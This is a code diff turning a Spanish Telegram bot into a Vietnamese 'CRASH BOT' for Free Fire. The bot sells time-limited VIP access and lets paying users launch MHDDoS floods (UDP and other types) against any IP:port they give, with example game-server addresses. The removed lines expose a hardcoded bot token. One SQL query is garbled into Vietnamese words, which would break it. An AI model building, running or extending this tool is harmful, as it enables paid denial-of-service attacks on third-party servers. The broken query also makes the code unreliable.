@@ -1,55 +1,217 @@
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+import telebot
 import subprocess
+import sqlite3
+from datetime import datetime, timedelta
+from threading import Lock
+import time
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "8019097232:AAGNUqNSWL_mUVCCupNZR6dd5ckOdzGmsT0"
+BOT_TOKEN = "TOKEN AQUI"
+ADMIN_ID = 7178876305
+START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
-# Lista de chats autorizados
-allowed_chats = ['-1002392775903']  # Reemplaza con los IDs de los chats autorizados
+bot = telebot.TeleBot(BOT_TOKEN)
+db_lock = Lock()
+cooldowns = {}
+active_attacks = {}
 
-# Comando para iniciar un ataque UDP
-async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # Verifica si el ID del chat está autorizado
-    chat_id = str(update.message.chat_id)
-    if chat_id not in allowed_chats:
-        await update.message.reply_text("Este chat no está autorizado para usar este comando.")
-        return
+conn = sqlite3.connect("users.db", check_same_thread=False)
+cursor = conn.cursor()
+cursor.execute(
+    """
+    CREATE TABLE IF NOT EXISTS vip_users (
+        id INTEGER PRIMARY KEY,
+        telegram_id INTEGER UNIQUE,
+        expiration_date TEXT
+    )
+    """
+)
+conn.commit()
 
-    # Verifica que el usuario haya ingresado los parámetros necesarios
-    if len(context.args) < 3:
-        await update.message.reply_text(
-            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
+
+@bot.message_handler(commands=["start"])
+def handle_start(message):
+    telegram_id = message.from_user.id
+
+    with db_lock:
+        cursor.execute(
+            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
+            (telegram_id,),
         )
-        return
+        result = cursor.fetchone()
 
-    # Obtiene los argumentos del mensaje
-    target = context.args[0]  # Dirección IP:Puerto
-    duration = context.args[1]  # Duración en segundos
-    threads = context.args[2]  # Número de threads
 
-    # Construye el comando a ejecutar
-    command = f"python3 start.py UDP {target} {duration} {threads}"
+    if result:
+        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
+        if datetime.now() > expiration_date:
+            vip_status = "❌ Gói Vip Của Bạn Đã Hết Hạn"
+        else:
+            dias_restantes = (expiration_date - datetime.now()).days
+            vip_status = (
+                f"✅ Người Dùng Vip\n"
+                f"⏳ Số ngày còn lại: {dias_restantes} ngày(s)\n"
+                f"📅 Ngày hết hạn: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
+            )
+    else:
+        vip_status = "❌Bạn Không Có Gói Vip Nào Đang Hoạt Động"
+    markup = InlineKeyboardMarkup()
+    button = InlineKeyboardButton(
+        text="💻 Người bán - Chính thức 💻",
+        url=f"tg://user?id={ADMIN_ID}"
+
+    )
+    markup.add(button)
     
-    # Ejecuta el comando y responde al usuario
-    try:
-        process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        await update.message.reply_text(
-            f"Simulación UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
+    bot.reply_to(
+        message,
+        (
+            "🤖CHÀO MỪNG ĐẾN VỚI CRASH BOT [Free Fire]!"
+            
+
+            f"""
+```
+{vip_status}```\n"""
+            "📌 *Cách sử dụng:*"
+            """
+```
+/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
+            "💡 *Ví dụ:*"
+            """
+```
+/crash UDP 143.92.125.230:10013 10 900```\n"""
+            "💠 NGƯỜI DÙNG VIP 💠"
+        ),
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
+
+
+@bot.message_handler(commands=["vip"])
+def handle_addvip(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ Bạn không phải là người bán được ủy quyền.")
+        return
+
+    args = message.text.split()
+    if len(args) != 3:
+        bot.reply_to(
+            message,
+            "❌ Định dạng không hợp lệ. Sử dụng: `/vip <ID> <BAO NHIÊU NGÀY>`",
+            parse_mode="Markdown",
         )
-    except Exception as e:
-        await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
+        return
 
-# Configuración principal del bot
-def main():
-    # Crea la aplicación del bot
-    application = Application.builder().token(TOKEN).build()
+    telegram_id = args[1]
+    days = int(args[2])
+    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
 
-    # Agrega el handler para el comando /udp
-    application.add_handler(CommandHandler("udp", udp_attack))
+    with db_lock:
+        cursor.execute(
+            """
+            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
+            VALUES (?, ?)
+            """,
+            (telegram_id, expiration_date),
+        )
+        conn.commit()
 
-    # Inicia el bot
-    application.run_polling()
+    bot.reply_to(message, f"✅ Người dùng {telegram_id} đã được thêm làm VIP trong {days} ngày.")
+
+
+@bot.message_handler(commands=["crash"])
+def handle_ping(message):
+    telegram_id = message.from_user.id
+
+    with db_lock:
+        cursor.execute(
+            "CHỌN ngày hết hạn TỪ vip_users NƠI telegram_id = ?",
+            (telegram_id,),
+        )
+        result = cursor.fetchone()
+
+    if not result:
+        bot.reply_to(message, "❌ Bạn không có quyền sử dụng lệnh này.")
+        return
+
+    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
+    if datetime.now() > expiration_date:
+        bot.reply_to(message, "❌ Quyền truy cập VIP của bạn đã hết hạn")
+        return
+
+    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 10:
+        bot.reply_to(message, "❌ Chờ 10 giây trước khi bắt đầu đòn tấn công tiếp theo và nhớ dừng đòn tấn công trước đó.")
+        return
+
+    args = message.text.split()
+    if len(args) != 5 or ":" not in args[2]:
+        bot.reply_to(
+            message,
+            (
+                "❌ *Định dạng không hợp lệ!*\n\n"
+                "📌 *Cách sử dụng đúng:*\n"
+                "`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
+                "💡 *Ví dụ:*\n"
+                "`/crash UDP 143.92.125.230:10013 10 900`"
+            ),
+            parse_mode="Markdown",
+        )
+        return
+
+    attack_type = args[1]
+    ip_port = args[2]
+    threads = args[3]
+    duration = args[4]
+    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]
+
+    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    active_attacks[telegram_id] = process
+    cooldowns[telegram_id] = time.time()
+
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("⛔ Dừng tấn công", callback_data=f"stop_{telegram_id}"))
+
+    bot.reply_to(
+        message,
+        (
+            "*[✅] ĐÃ BẮT ĐẦU TẤN CÔNG - 200 [✅]*\n\n"
+            f"🌐 *Cảng:* {ip_port}\n"
+            f"⚙️ *Kiểu:* {attack_type}\n"
+            f"🧟‍♀️ *Chủ đề:* {threads}\n"
+            f"⏳ *Thời gian (ms):* {duration}\n\n"
+            f"💠 NGƯỜI DÙNG VIP 💠"
+        ),
+        reply_markup=markup,
+        parse_mode="Markdown",
+    )
+
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
+def handle_stop_attack(call):
+    telegram_id = int(call.data.split("_")[1])
+
+    if call.from_user.id != telegram_id:
+        bot.answer_callback_query(
+            call.id, "❌ Chỉ có người dùng bắt đầu cuộc tấn công mới có thể dừng nó"
+        )
+        return
+
+    if telegram_id in active_attacks:
+        process = active_attacks[telegram_id]
+        process.terminate()
+        del active_attacks[telegram_id]
+
+        bot.answer_callback_query(call.id, "✅ Đòn tấn công đã bị đỡ thành công.")
+        bot.edit_message_text(
+            "*[⛔] KẾT THÚC CUỘC TẤN CÔNG[⛔]*",
+            chat_id=call.message.chat.id,
+            message_id=call.message.id,
+            parse_mode="Markdown",
+        )
+        time.sleep(3)
+        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
+    else:
+        bot.answer_callback_query(call.id, "❌ Không tìm thấy đòn tấn công nào, vui lòng tiếp tục hành động của bạn.")
 
 if __name__ == "__main__":
-    main()
+    bot.infinity_polling()
+            
